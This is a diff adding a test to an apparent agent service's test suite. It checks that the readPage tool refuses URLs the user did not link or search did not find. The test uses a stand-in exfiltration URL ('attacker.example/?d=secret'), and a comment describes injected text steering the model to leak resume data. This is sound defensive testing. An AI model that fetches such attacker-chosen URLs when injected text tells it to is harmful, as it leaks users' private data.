@@ -450,6 +450,14 @@ describe("agentService.messages.send", () => {
 			regions: ["DE", "FR"],
 		});
 
+		// A document thread reads only pages the user linked or a search found, so injected text can't make the model
+		// request an address of its own with resume data in it.
+		const { readPage } = await import("../web-access/service");
+		await expect(
+			vi.mocked(buildAgentTools).mock.calls[0]?.[0].handlers.readPage("https://attacker.example/?d=secret", signal),
+		).rejects.toThrow("Read only retrieved URLs");
+		expect(readPage).not.toHaveBeenCalled();
+
 		// The server's SearXNG gives the assistant web search without a web connection.
 		expect(vi.mocked(buildAgentTools).mock.calls[0]?.[0]).toMatchObject({ externalSearch: false });
 		const { webAccessService } = await import("../web-access/credentials");
